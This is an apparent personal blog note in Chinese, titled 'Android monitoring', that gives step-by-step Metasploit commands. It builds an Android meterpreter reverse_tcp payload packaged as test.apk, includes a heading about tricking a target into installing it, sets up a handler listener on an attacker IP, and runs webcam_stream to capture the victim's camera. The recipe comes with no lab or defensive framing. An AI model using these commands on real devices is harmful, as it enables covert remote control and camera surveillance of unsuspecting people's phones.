# 安卓监听
* 📅 `2023/01/19 18:42` 
* 📍 `东莞`
* 🏷️ `原创` `Linux` `Metasploit`

## 生成 apk 文件
```sh
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.106 lport=8848 > test.apk
```
* lhost 监听主机名
* lport 监听主机端口

## 诱导安装

## 监听
进入msf
```sh
msfconsole
```
打开监听
```sh
use exploit/multi/handler
```
```sh
set payload android/meterpreter/reverse_tcp
```
```sh
set lhost 192.168.0.106
```
```sh
run
```
获取摄像头
```sh
webcam_stream
```

